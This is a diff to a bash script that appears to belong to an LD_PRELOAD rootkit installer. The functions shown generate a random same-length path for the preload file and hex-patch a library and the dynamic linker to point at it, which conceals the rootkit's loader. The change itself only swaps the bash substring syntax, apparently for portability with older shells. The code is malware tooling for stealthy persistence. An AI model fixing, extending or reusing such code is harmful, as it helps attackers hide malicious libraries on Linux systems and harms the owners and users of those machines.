@@ -33,7 +33,7 @@ find_preload_location()
 
 # builds new location string for the preload file.
 get_new_preload(){ echo -n "`$script_root/get_rand_path.sh 2`.`random 'A-Za-z0-9' 8`"; }
-hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::-2}00" | awk '{print toupper($0)}'; }
+hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::${#HS}-2}00" | awk '{print toupper($0)}'; }
 
 patch_lib() # $1=target lib, $2=old preload file, $3=new preload file
 {
@@ -61,7 +61,7 @@ patch_dynamic_linker() # $1=old preload file
         new_preload="`get_new_preload`" # generate new preload file location
 
         # the new file location has got to be the same length as the previous
-        while [ ${#new_preload} -gt ${#old_preload} ]; do new_preload=${new_preload::-1}; done
+        while [ ${#new_preload} -gt ${#old_preload} ]; do new_preload=${new_preload::${#new_preload}-1}; done
         while [ ${#new_preload} -lt ${#old_preload} ]; do new_preload+="`random 'A-Za-z0-9' 1`"; done
     done
 
